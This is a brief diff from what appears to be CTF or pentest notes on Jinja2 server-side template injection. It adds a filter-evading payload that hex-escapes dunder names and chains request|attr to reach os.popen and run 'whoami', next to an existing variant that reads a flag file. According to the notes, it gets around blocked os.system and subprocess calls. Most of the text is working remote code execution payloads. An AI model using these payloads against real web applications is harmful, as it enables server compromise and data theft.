@@ -86,6 +86,10 @@ request|attr(‘application’)|attr(“__globals__”)
 
     — Avoids blocked `os.system()` and `subprocess.Popen()`.
   - payload:
+
+```
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('whoami')|attr('read')()}}
+```
 ```
 {{request|attr(‘application’)|attr(“\x5f\x5fglobals\x5f\x5f”)|attr(‘\x5f\x5fgetitem\x5f\x5f’)(‘\x5f\x5fbuiltins\x5f\x5f’)|attr(‘\x5f\x5fgetitem\x5f\x5f’)(“\x5f\x5fimport\x5f\x5f”)(‘os’)|attr(‘popen’)(‘cat flag’)|attr(‘read’)()}}
 ```
